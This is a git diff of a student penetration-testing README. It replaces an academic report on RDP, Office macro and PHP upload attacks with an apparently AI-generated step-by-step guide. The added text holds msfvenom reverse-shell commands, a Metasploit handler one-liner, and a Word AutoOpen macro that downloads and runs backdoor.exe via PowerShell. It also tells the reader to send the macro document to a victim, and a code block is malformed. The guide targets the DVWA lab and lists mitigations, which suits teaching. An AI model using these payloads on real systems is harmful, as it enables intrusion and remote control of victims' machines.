@@ -1,121 +1,128 @@
-# Penetration Testing Insights: RDP, Macro Exploits, and PHP Shell Uploads
+# Penetration Testing Insights: RDP, Macro Exploits, and PHP Shell Uploads  
+*A practical guide to understanding common cybersecurity vulnerabilities and mitigation strategies.*
 
-**Author:** Mst. Awalunnisa  
-**Student ID:** 242-56-002  
-**Course:** CS516: Ethical Hacking  
-**University:** Daffodil International University  
-**Semester:** Fall 2024  
-**Date:** November 2024
+---
 
-## Abstract
+## 📌 Overview  
+This project demonstrates three critical cybersecurity exploitation techniques:  
+1. **PHP Backdoor via File Upload Vulnerabilities** (using DVWA).  
+2. **Macro-Based Exploitation in MS-Office**.  
+3. **RDP Exploitation in Windows 11**.  
 
-This project examines three major cyber exploitation techniques: RDP exploitation, malicious macros, and PHP backdoors via file upload vulnerabilities. It outlines how attackers exploit these weaknesses to gain unauthorized access and highlights effective mitigation strategies, including multi-factor authentication, disabling macros by default, and secure file validation. The project emphasizes proactive measures like regular patching, secure coding, and user education to enhance organizational cybersecurity.
+It also provides actionable mitigation strategies to defend against these attacks.  
 
-## Acknowledgements
+---
 
-I extend my heartfelt gratitude to all who supported me in completing this project. Special thanks to N.M.I Raisul Bari, my teacher at Daffodil International University, for his invaluable guidance and feedback. I also appreciate the Department of Computer Science and Engineering for providing resources, and my family for their unwavering support.
+## 🛠️ Prerequisites  
+- **Tools**:  
+  - Kali Linux (for Metasploit, msfvenom).  
+  - DVWA (Damn Vulnerable Web Application).  
+  - Microsoft Office (for macro testing).  
+  - Python 3 (for RDP brute-force script).  
+- **Basic Knowledge**:  
+  - Familiarity with command-line tools.  
+  - Understanding of ethical hacking principles.  
 
-## Table of Contents
+---
 
-1. [Introduction](#introduction)
-2. [Background Information](#background-information)
-3. [Exploitation Processes](#exploitation-processes)
-4. [Conclusions and Recommendations](#conclusions-and-recommendations)
-5. [Bibliography](#bibliography)
+## 🔧 Setup Instructions  
 
-## Introduction
+### 1. PHP File Upload Exploitation (DVWA)  
+- **Step 1**: Install DVWA and set security level to *"Low"*.  
+- **Step 2**: Generate a PHP reverse shell payload:  
+  ```bash
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=8000 -f raw > shell.php
+Step 3: Upload shell.php to DVWA.
 
-### Problem Statement
+Step 4: Start Metasploit handler:
 
-Cyberattacks have become more sophisticated, targeting system vulnerabilities such as RDP exploitation, macro-based exploitation, and PHP backdoors via file upload vulnerabilities. This project aims to analyze these techniques, assess the risks they pose, and propose practical solutions to mitigate their impact.
+```bash
+msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST <YOUR_IP>; set LPORT 8000; exploit"
+```
+- **Step 5**: Execute the uploaded file in DVWA to gain a reverse shell.
 
-### Objective of the Project
+### 2. Macro-Based Exploitation (MS-Office)
+- **Step 1**: Generate a malicious payload:
 
-- **Analyze Exploitation Techniques:** Investigate RDP, macro, and PHP backdoor file upload vulnerabilities.
-- **Demonstrate Attack Mechanisms:** Showcase exploitation techniques and demonstrate how attackers gain unauthorized access.
-- **Assess Security Risks:** Evaluate the potential risks, including unauthorized access, data theft, and system compromise.
-- **Propose Mitigation Strategies:** Recommend best practices to prevent or minimize the impact of these exploits.
-- **Enhance Cybersecurity Awareness:** Increase awareness of cybersecurity threats and encourage adoption of security protocols.
+```bash
 
-### Literature Review
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=6666 -f exe > backdoor.exe
+```
 
-- **RDP Exploitation:** Vulnerabilities like BlueKeep can lead to remote code execution, mitigated by strong passwords and multi-factor authentication.
-- **Macro-Based Exploitation:** Malicious macros can spread malware through social engineering; mitigation includes disabling macros and user training.
-- **PHP Backdoor via File Upload Vulnerabilities:** These attacks exploit file upload mechanisms to gain control; mitigation involves file validation and restricting script execution.
+- **Step 2**: Host the payload on a local server (e.g., python3 -m http.server 8000).
 
-### Methodology Adopted
+- **Step 3**: Create a Word macro to download and execute backdoor.exe:
 
-- Set up vulnerable environments for each attack type.
-- Perform the attacks using appropriate tools.
-- Analyze vulnerabilities and implement basic security measures to assess their effectiveness.
 
-### Results
+```bash
+Sub AutoOpen()
+  Shell "powershell -c Invoke-WebRequest http://<YOUR_IP>:8000/backdoor.exe -OutFile %Temp%\backdoor.exe; Start-Process %Temp%\backdoor.exe"
+End Sub
+```
 
-The project demonstrated that RDP, macro-based, and PHP backdoor attacks can gain unauthorized access to systems. However, implementing multi-factor authentication, disabling macros, and validating file uploads successfully mitigated these vulnerabilities.
+- **Step 4**: Start the Metasploit handler (similar to Step 4 above).
 
-## Background Information
+- **Step 5**: Send the document to the victim. When macros are enabled, the payload executes.
 
-### Overview of RDP, Macro, and File Upload Vulnerabilities
+### 3. RDP Exploitation (Brute-Force Attack)
+- **Step 1**: Create a Python script (rdp_brute.py) to brute-force credentials (see code snippet below).
 
-- **File Upload Vulnerabilities:** Attackers exploit improperly handled file uploads, leading to remote code execution and server compromise.
-- **Office Macro Exploits:** Malicious macros in Office documents can execute malware on Windows systems when the user enables them.
-- **RDP Exploitation:** RDP vulnerabilities like BlueKeep allow unauthorized access through brute-forcing weak credentials and exploiting unpatched systems.
+- **Step 2**: Run the script:
 
-### Importance in Cybersecurity
+```bash
+python3 rdp_brute.py
+```
 
-- Identifying vulnerabilities before exploitation.
-- Strengthening security defenses.
-- Reducing the risk of data breaches.
+# Sample RDP brute-force script (replace IP, usernames, passwords)
+```python
+import subprocess
 
-## Exploitation Processes
+def check_rdp(host, username, password):
+    # ... (refer to Figure 3.3.1 in the report for full code)
+🛡️ Mitigation Strategies
+For PHP Uploads:
+```
 
-### 1. File Upload PHP Backdoor in DVWA
+- Validate file types (extension + MIME type).
 
-- **Environment Setup:** Configure DVWA and set the security level to "low."
-- **Payload Creation:** Use `msfvenom` to generate a PHP reverse shell.
-- **Exploitation:** Upload the payload to DVWA and use Metasploit to exploit the vulnerability.
-
-**Remediations:**
-- Validate file types.
-- Rename uploaded files to prevent malicious extensions.
 - Store files outside the web root.
-- Disable PHP execution in the upload directory.
 
-### 2. Macro-Based Exploitation in MS-Office
+- Disable PHP execution in upload directories.
 
-- **Payload Creation:** Use `msfvenom` to generate a reverse TCP payload.
-- **Exploitation:** Write a macro script to trigger the payload execution when the document is opened.
+ ### For Macros:
 
-**Remediations:**
 - Disable macros by default.
-- Use antivirus software to detect malicious macros.
-- Apply security updates to Office applications.
 
-### 3. Windows 11 RDP Exploitation
+- Use trusted digital signatures.
 
-- **Exploitation Process:** Write a Python script to brute-force RDP credentials and gain access.
-- **Remediations:**
-  - Apply security patches.
-  - Use multi-factor authentication and restrict RDP access using firewalls.
-  - Monitor RDP sessions for unusual activity.
+- Enable Protected View.
 
-## Conclusions and Recommendations
+### For RDP:
 
-### Conclusions
+- Enforce Multi-Factor Authentication (MFA).
 
-The project highlights the risks of RDP, macro, and PHP backdoor exploits and stresses the importance of proactive security measures.
+-  Restrict RDP access via VPN/firewall.
 
-### Recommendations
+- Apply security patches (e.g., BlueKeep).
 
-- Implement multi-factor authentication for RDP.
-- Disable macros by default.
-- Validate file uploads and restrict script execution.
-- Conduct regular penetration testing.
-- Educate users on security risks, including phishing.
+## 📚 References
+OWASP File Upload Guidelines
 
-## Bibliography
+Microsoft RDP Security Advisory
 
-- Microsoft Security Advisory (2019). "CVE-2019-0708: Remote Desktop Protocol (RDP) Vulnerability." [Microsoft](https://support.microsoft.com/en-us/help/4500705).
-- Symantec Threat Report (2020). "Macro-Based Malware in 2020: A Persistent Threat." [Symantec](https://www.symantec.com).
-- OWASP Foundation (2020). "Top Ten Web Application Security Risks - File Upload Vulnerability." [OWASP](https://owasp.org/www-project-top-ten/).
-- Kaspersky Lab (2020). "Web Application Security: PHP Backdoors and File Upload Exploits." [Kaspersky](https://www.kaspersky.com).
+Metasploit Documentation
+
+### ⚠️ Disclaimer
+This project is for educational purposes only. Always obtain proper authorization before testing systems.
+
+🙏 Acknowledgments
+Special thanks to N.M.I Raisul Bari (Daffodil International University) for guidance.
+
+
+---
+
+**How to Use This README**:  
+1. Replace `<YOUR_IP>` with your local IP (use `ifconfig` or `ipconfig`).  
+2. Ensure all tools (DVWA, Metasploit) are properly installed.  
+3. Follow ethical guidelines—do not test on unauthorized systems.
+This response is AI-generated, for reference only.
